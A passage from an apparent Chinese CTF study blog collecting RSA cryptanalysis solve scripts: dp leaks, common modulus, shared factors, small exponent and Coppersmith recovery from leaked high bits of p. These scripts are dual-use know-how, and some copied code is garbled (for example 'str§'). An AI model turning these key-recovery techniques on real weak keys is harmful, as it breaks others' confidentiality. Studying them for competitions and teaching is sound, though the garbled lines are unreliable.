class="built_in">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/MikeCoke/article/details/105967809">(4条消息) BUUCTF RSA题目全解1_buuctf rsa1_宁嘉的博客-CSDN博客</a></p><h2 id="已知-e-dp-n-c-，求m"><a href="#已知-e-dp-n-c-，求m" class="headerlink" title="已知(e,dp, n, c)，求m"></a>已知(e,dp, n, c)，求m</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">e = 65537</span><br><span class="line">n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line"></span><br><span class="line">c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br><span class="line"></span><br><span class="line">for i in range(1,e):</span><br><span class="line">    if (e*dp-1)%i == 0 and n%((e*dp-1)//i+1)==0:</span><br><span class="line">        q = n//((e*dp-1)//i+1)</span><br><span class="line">        phi = (q-1)*((e*dp-1)//i)</span><br><span class="line">        d = gmpy2.invert(e,phi)</span><br><span class="line">        m = gmpy2.powmod(c,d,n)</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br><span class="line">n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br><span class="line">e1=11187289</span><br><span class="line">c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br><span class="line">e2=9647291</span><br></pre></td></tr></table></figure><h2 id="已知-n-e1-e2-c1-c2-，求m。"><a href="#已知-n-e1-e2-c1-c2-，求m。" class="headerlink" title="已知(n, e1, e2,c1,c2)，求m。"></a>已知(n, e1, e2,c1,c2)，求m。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">n = 22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br><span class="line">c1 = 22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br><span class="line">c2 = 18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br><span class="line">e1 = 11187289</span><br><span class="line">e2 = 9647291</span><br><span class="line"></span><br><span class="line">s = gmpy2.gcdext(e1,e2)</span><br><span class="line">a = s[1]</span><br><span class="line">b = s[2]</span><br><span class="line"></span><br><span class="line">if a&lt;0:</span><br><span class="line">    a = -a</span><br><span class="line">    c1 = gmpy2.invert(c1,n)</span><br><span class="line">else:</span><br><span class="line">    b = -b</span><br><span class="line">    c2 = gmpy2.invert(c2,n)</span><br><span class="line"></span><br><span class="line">m = (gmpy2.powmod(c1,a,n)*gmpy2.powmod(c2,b,n))%n</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure><h2 id="已知-e-n1-c1-n2-c2-，求m。"><a href="#已知-e-n1-c1-n2-c2-，求m。" class="headerlink" title="已知( e,n1,c1,n2,c2)，求m。"></a>已知( e,n1,c1,n2,c2)，求m。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">n1 = 23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747</span><br><span class="line">c1 = 1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815</span><br><span class="line"></span><br><span class="line">n2 = 22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711</span><br><span class="line">c2 = 2742600695441836559469553702831098375948641915409106976157840377978123912007398753623461112659796209918866985480471911393362797753624479537646802510420415039461832118018849030580675249817576926858363541683135777239322002741820145944286109172066259843766755795255913189902403644721138554935991439893850589677849639263080528599197595705927535430942463184891689410078059090474682694886420022230657661157993875931600932763824618773420077273617106297660195179922018875399174346863404710420166497017196424586116535915712965147141775026549870636328195690774259990189286665844641289108474834973710730426105047318959307995062</span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q = n1 // p</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c1,d,n1)</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure><h2 id="已知-p-q-p-q-e-c-，求m。"><a href="#已知-p-q-p-q-e-c-，求m。" class="headerlink" title="已知(p+q,p-q, e,c)，求m。"></a>已知(p+q,p-q, e,c)，求m。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">e=16300321</span><br><span class="line"></span><br><span class="line">a=21350430512059560135536506725886192791652921782342757815537127809818896096167861777432862988721624947176730121127946250044713187944377040826978092675745896</span><br><span class="line"></span><br><span class="line">b=1553262765888789433201396543987134442184487100865056152409628170591088051337453032936901834118611146414395714768350794090251064953913440485676167006809370</span><br><span class="line"></span><br><span class="line">c=54505145716437017236783669089525458569996474667747952435007039609752579283598944353442923680602360632342975079757448484712025793719352475806343163818881133707590318426509468029706897810742965068881431810720947035196632950024324040788801133194474150406380691624739115334015886740557921339305357167098392744905</span><br><span class="line"></span><br><span class="line">p = (a+b)//2</span><br><span class="line">q = (a-b)//2</span><br><span class="line"></span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(c,d,p*q)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h2 id="已知-e-n-c-，求m。"><a href="#已知-e-n-c-，求m。" class="headerlink" title="已知(e,n,c)，求m。"></a>已知(e,n,c)，求m。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">n = 1455925529734358105461406532259911790807347616464991065301847</span><br><span class="line">c = 69380371057914246192606760686152233225659503366319332065009</span><br><span class="line">p = 1201147059438530786835365194567</span><br><span class="line">q = 1212112637077862917192191913841</span><br><span class="line"></span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure><h2 id="已知-e-n-c-，求m。-1"><a href="#已知-e-n-c-，求m。-1" class="headerlink" title="已知(e,n,c)，求m。"></a>已知(e,n,c)，求m。</h2><p>e比较小时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">e = 3</span><br><span class="line">n = 18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761</span><br><span class="line">c = 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    if gmpy2.iroot((c+i*n),3)[1] == True:</span><br><span class="line">        m = gmpy2.iroot((c+i*n),3)[0]</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h2><p>当存在两个公钥的 N 不互素时，我们显然可以直接对这两个数求最大公因数，然后直接获得 p，q，进而获得相应的私钥。</p><h2 id="P高位泄露"><a href="#P高位泄露" class="headerlink" title="P高位泄露"></a>P高位泄露</h2><h3 id="CISCN-2021初赛-rsa"><a href="#CISCN-2021初赛-rsa" class="headerlink" title="[CISCN 2021初赛]rsa"></a>[CISCN 2021初赛]rsa</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from flag import text,flag</span><br><span class="line">import md5</span><br><span class="line">from Crypto.Util.number import long_to_bytes,bytes_to_long,getPrime</span><br><span class="line"></span><br><span class="line">assert md5.new(text).hexdigest() == flag[6:-1]</span><br><span class="line"></span><br><span class="line">msg1 = text[:xx]</span><br><span class="line">msg2 = text[xx:yy]</span><br><span class="line">msg3 = text[yy:]</span><br><span class="line"></span><br><span class="line">msg1 = bytes_to_long(msg1)</span><br><span class="line">msg2 = bytes_to_long(msg2)</span><br><span class="line">msg3 = bytes_to_long(msg3)</span><br><span class="line"></span><br><span class="line">p1 = getPrime(512)</span><br><span class="line">q1 = getPrime(512)</span><br><span class="line">N1 = p1*q1</span><br><span class="line">e1 = 3</span><br><span class="line"><span class="built_in">print</span> pow(msg1,e1,N1)</span><br><span class="line"><span class="built_in">print</span> (e1,N1)//第一部分低加密指数攻击</span><br><span class="line"></span><br><span class="line">p2 = getPrime(512)</span><br><span class="line">q2 = getPrime(512)</span><br><span class="line">N2 = p2*q2</span><br><span class="line">e2 = 17</span><br><span class="line">e3 = 65537</span><br><span class="line"><span class="built_in">print</span> pow(msg2,e2,N2)</span><br><span class="line"><span class="built_in">print</span> pow(msg2,e3,N2)</span><br><span class="line"><span class="built_in">print</span> (e2,N2)</span><br><span class="line"><span class="built_in">print</span> (e3,N2)//共模攻击</span><br><span class="line"></span><br><span class="line">p3 = getPrime(512)</span><br><span class="line">q3 = getPrime(512)</span><br><span class="line">N3 = p3*q3</span><br><span class="line"><span class="built_in">print</span> pow(msg3,e3,N3)</span><br><span class="line"><span class="built_in">print</span> (e3,N3)</span><br><span class="line"><span class="built_in">print</span> p3&gt;&gt;200 //p高位泄露类型</span><br></pre></td></tr></table></figure><p>解题脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Sage</span><br><span class="line">from sage.all import *</span><br><span class="line">n = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span><br><span class="line">p4 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span><br><span class="line"><span class="comment">#p去0的剩余位</span></span><br><span class="line">e = 65537</span><br><span class="line">pbits = 512</span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; <span class="string">kbits</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = x + p4</span></span><br><span class="line"><span class="string">roots = f.small_roots(X=2^kbits</span>, beta=0.4)</span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line">p = p4+int(roots[0])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n: &quot;</span>+str(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p: &quot;</span>+str§)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q: &quot;</span>+str(n//p))</span><br></pre></td></tr></table></figure><h3 id="sictf-的密码题"><a href="#sictf-的密码题" class="headerlink" title="sictf 的密码题"></a>sictf 的密码题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n = p * q</span><br><span class="line">e = 65537</span><br><span class="line">leak = p &gt;&gt; 230</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span></span><br><span class="line"><span class="string">6833525680083767201563383553257365403889275861180069149272377788671845720921410137177</span></span><br><span class="line"><span class="string">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>一般情况下需要已知286位才能求解512的p</p><p>但是把small_roots(epsilon &#x3D; 0.01)改动epsilon参数为0.01可以在已知264位的情况下求解p</p><p>题目给出高282，修改参数epsilon即可求解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Sage</span><br><span class="line">from sage.all import *</span><br><span class="line">n = 114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span><br><span class="line">p4 = 6833525680083767201563383553257365403889275861180069149272377788671845720921410137177</span><br><span class="line"><span class="comment">#p去0的剩余位</span></span><br><span class="line">e = 65537</span><br><span class="line">pbits = 512</span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; <span class="string">kbits</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = x + p4</span></span><br><span class="line"><span class="string">roots = f.small_roots(X=2^kbits</span>, beta=0.4,epsilon=0.01)</span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line"> p = p4+int(roots[0])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n: &quot;</span>+str(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q: &quot;</span>+str(n//p))</span><br></pre></td></tr></table></figure><h2 id="p-2-q-2"><a href="#p-2-q-2" class="headerlink" title="p^2+q^2"></a>p^2+q^2</h2><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from secret import flag</span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(200)</span><br><span class="line"></span><br><span class="line">a = p**2 + q**2</span><br><span class="line">n = p * q</span><br><span class="line">e1 = getPrime(16)</span><br><span class="line">e2 = next_prime(e1)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c1 = powmod(m,e1,n)</span><br><span class="line">c2 = powmod(m**3,e2,3*n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>, c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">a = 23804021940078676408342301332036892900004728136480076479530219752065125327318821647722459216095770264965388973551323635311313178838670860487788476788686756050157264721772586844596306406576857878507037529439070526513923394974678433717664180257965624133033383511215139076867891548866207158515487182813656668091870588002638518245252590786003914393372830494390833657940568569618842104970029260363695053572749495893999945220493935637334868029460448282514843103145795102173534495304156971490358608124680851055950154432367509652612855903019752959349069234185596982394068554146096092741880878895682860091022727772496856721290</span></span><br><span class="line"><span class="string">c1 = 75949211970645260477840809230795170598275394663655585446502049744151634977806266592064437936389888280642329073167371358021391264606028082728274944584341647324957857195053188220196244561623697425292916511744852569537275299008074069250282222480373555169325242455879869868679935977005580843853804599341730525546675515324718058489296906319060874296111833437083796029771812</span></span><br><span class="line"><span class="string">c2 = 77907941155376849046818020584594846942386293571953448410760364023962818506838837521412252753647936913064982141652362831680077554268552176063108954360620095019160785058740575077744544616439692739387312706279917959252426192939648962492950940347253817951644007140862267776520611944302335981903665518644840891111449931544355548130487697653008605945892957382219567188182572</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>将已知量p 2 + q 2 p^2 + q ^2p<br>2<br>+q<br>2<br>直接开方即可得到较大的数p pp，因为开方会使得含有较小的数q 2 q^2q<br>2<br>的部分丢失，剩余的正好使p 2 p^2p<br>2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">a = 23804021940078676408342301332036892900004728136480076479530219752065125327318821647722459216095770264965388973551323635311313178838670860487788476788686756050157264721772586844596306406576857878507037529439070526513923394974678433717664180257965624133033383511215139076867891548866207158515487182813656668091870588002638518245252590786003914393372830494390833657940568569618842104970029260363695053572749495893999945220493935637334868029460448282514843103145795102173534495304156971490358608124680851055950154432367509652612855903019752959349069234185596982394068554146096092741880878895682860091022727772496856721290</span><br><span class="line">c1 = 75949211970645260477840809230795170598275394663655585446502049744151634977806266592064437936389888280642329073167371358021391264606028082728274944584341647324957857195053188220196244561623697425292916511744852569537275299008074069250282222480373555169325242455879869868679935977005580843853804599341730525546675515324718058489296906319060874296111833437083796029771812</span><br><span class="line">c2 = 77907941155376849046818020584594846942386293571953448410760364023962818506838837521412252753647936913064982141652362831680077554268552176063108954360620095019160785058740575077744544616439692739387312706279917959252426192939648962492950940347253817951644007140862267776520611944302335981903665518644840891111449931544355548130487697653008605945892957382219567188182572</span><br><span class="line"></span><br><span class="line">p = gmpy2.iroot(a, 2)[0]</span><br><span class="line">q = gmpy2.iroot(a - p ** 2, 2)[0]</span><br><span class="line">n = p * q</span><br><span class="line">fai_n = (p - 1) * (q - 1)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> tqdm(range(2**16)):</span><br><span class="line">    try:</span><br><span class="line">        d = gmpy2.invert(e, fai_n)</span><br><span class="line">        m1 = pow(c1, d, n)</span><br><span class="line">        try:</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m1).decode())</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">continue</span></span><br></pre></td></tr></table></figure><h2 id="dp低位泄露"><a href="#dp低位泄露" class="headerlink" title="dp低位泄露"></a>dp低位泄露</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">def getFullP(low_p, n):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    p = x*2^512 + low_p</span><br><span class="line">    root = (p-n).monic().small_roots(X = 2^128, beta = 0.4)</span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        <span class="built_in">return</span> p(root[0])</span><br><span class="line">    <span class="built_in">return</span> None</span><br><span class="line">    </span><br><span class="line">def phase4(low_d, n, c):</span><br><span class="line">    maybe_p = []</span><br><span class="line">    <span class="keyword">for</span> k <span 